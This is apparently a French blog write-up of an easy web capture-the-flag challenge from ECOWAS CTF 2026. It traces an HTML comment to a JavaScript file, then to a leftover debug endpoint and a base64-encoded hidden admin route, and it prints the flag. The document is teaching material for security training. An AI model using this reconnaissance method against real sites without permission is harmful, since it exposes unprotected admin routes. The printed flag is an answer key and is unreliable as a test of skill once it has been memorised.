---
layout: post
title: "ECOWAS CTF 2026 — Hidden User Management [Web/100pts]"
date: 2026-04-24 11:21:00 +0000
categories: [CTF, ECOWAS-CTF-2026]
tags: [web, js-analysis, hidden-endpoint, base64, recon, debug-endpoint, flask]
toc: true
---

> **CTF :** ECOWAS CTF 2026 · **Catégorie :** Web · **Difficulté :** ⭐ (Easy) · **Points :** 100  
> **[← Retour à l'index du CTF](/portfolio/blog/posts/ecowas-ctf-2026/)**

---

## Description

Un panneau de gestion utilisateur. Quelque chose est resté en production qu'il n'aurait pas dû y être.

---

## Analyse

**Chaîne d'exploitation :**
1. Source HTML → commentaire → référence à un fichier JavaScript
2. JS → endpoint de debug hardcodé
3. Endpoint de debug → chemin encodé en Base64
4. Route cachée → flag

---

## Solution

### Étape 1 — Lire le source HTML

**Via le navigateur :**
- Clic droit sur la page → `View Page Source` (ou `Ctrl+U`)
- Chercher `<!--` et `.js` pour trouver les commentaires et scripts

**Via curl :**
```bash
curl http://challenge-url/ | grep -E "<!--|\\.js"
```

**Via Burp Suite :**
- Intercepter la réponse HTTP dans `HTTP History`
- Dans le volet Response, faire `Ctrl+F` pour chercher "js" ou "debug"

Commentaire trouvé :
```html
<!-- Debug: voir /static/app.js -->
```

### Étape 2 — Analyser app.js

```bash
curl http://challenge-url/static/app.js
```

Contenu :
```javascript
const debugEndpoint = '/api/secret';
// TODO: Supprimer avant la mise en prod
```

### Étape 3 — Appeler l'endpoint de debug

```bash
curl http://challenge-url/api/secret
```

Réponse :
```json
{"data": "YWRtaW4tcGFuZWw="}
```

### Étape 4 — Décoder et accéder

```bash
echo "YWRtaW4tcGFuZWw=" | base64 -d
# → admin-panel

curl http://challenge-url/admin-panel
# → {"flag": "EcowasCTF{st@ge_m@ster!!}"}
```

---

## Flag

```text
EcowasCTF{st@ge_m@ster!!}
```

---

## Leçons retenues

- Toujours lire le source HTML ET les fichiers JS référencés — les devs oublient d'enlever les endpoints de debug
- Les données encodées en Base64 dans les réponses API cachent souvent des routes ou des tokens
- Méthodologie : Source → JS → Endpoints → Accès
- **Pour les devs :** ne jamais laisser des `debugEndpoint` en production, utiliser des variables d'environnement

**[← Retour à l'index ECOWAS CTF 2026](/portfolio/blog/posts/ecowas-ctf-2026/)**
